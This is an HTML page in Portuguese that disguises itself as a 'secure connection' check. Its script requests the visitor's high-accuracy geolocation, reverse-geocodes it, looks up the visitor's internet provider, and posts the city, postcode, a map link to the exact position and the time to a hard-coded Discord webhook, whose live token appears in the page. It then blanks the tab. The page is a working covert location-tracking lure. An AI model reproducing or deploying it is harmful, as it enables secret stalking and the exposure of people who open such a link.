<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Check</title>
    <style>
        body { background: #0b0f19; color: #f1f5f9; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #161b22; padding: 30px; border-radius: 12px; border: 1px solid #30363d; text-align: center; }
        .spinner { border: 4px solid #21262d; border-top: 4px solid #3b82f6; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .toast { position: fixed; top: 10px; right: 10px; background: #3b82f6; color: white; padding: 10px; border-radius: 5px; font-size: 12px; }
    </style>
</head>
<body>
    <div id="t"></div>
    <div class="card">
        <div class="spinner"></div>
        <p>Validando conex√£o segura...</p>
    </div>

    <script>
        // SUA URL NOVA
        const URL = "https://discord.com/api/webhooks/1473792549045932103/9BrDwlVARrLj3joN4liqNqY8OmV07hF6hf8KtHwdA1nEr_sbeSq9So8SQlY9DL5weC9q";

        function msg(txt) {
            const d = document.createElement('div');
            d.className = 'toast'; d.innerText = txt;
            document.getElementById('t').appendChild(d);
            setTimeout(() => d.remove(), 2000);
        }

        async function enviar(dados) {
            await fetch(URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    embeds: [{
                        title: "üö® LOG DE ACESSO DETECTADO",
                        color: 5763719,
                        fields: [
                            { name: "üèôÔ∏è Cidade/Estado:", value: dados.local || "Buscando...", inline: true },
                            { name: "üìÆ Cep:", value: dados.cep || "N/A", inline: true },
                            { name: "üìç Localiza√ß√£o:", value: `https://www.google.com/maps?q=${dados.lat},${dados.lon}`, inline: false },
                            { name: "üåê Provedor:", value: dados.prov || "N/A", inline: false },
                            { name: "‚è∞ Hor√°rio:", value: new Date().toLocaleString('pt-BR'), inline: false }
                        ]
                    }]
                })
            });
            // FECHA A ABA OU REDIRECIONA
            window.location.href = "about:blank"; 
        }

        window.onload = () => {
            msg("Iniciando...");
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (p) => {
                    msg("Localizado!");
                    const lat = p.coords.latitude;
                    const lon = p.coords.longitude;

                    try {
                        // Tenta pegar a cidade real r√°pido
                        const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
                        const d = await r.json();
                        const ipR = await fetch('https://ipapi.co/json/').then(res => res.json());

                        await enviar({
                            lat: lat, lon: lon,
                            local: `${d.address.city || d.address.town}, ${d.address.state}`,
                            cep: d.address.postcode,
                            prov: ipR.org
                        });
                    } catch (e) {
                        // Se a busca da cidade travar, envia s√≥ as coordenadas para n√£o perder o log
                        await enviar({ lat: lat, lon: lon, local: "Erro na tradu√ß√£o (veja o mapa)", prov: "IP Independente" });
                    }
                }, () => {
                    window.location.href = "https://google.com";
                }, { enableHighAccuracy: true, timeout: 5000 });
            }
        };
    </script>
</body>
</html>
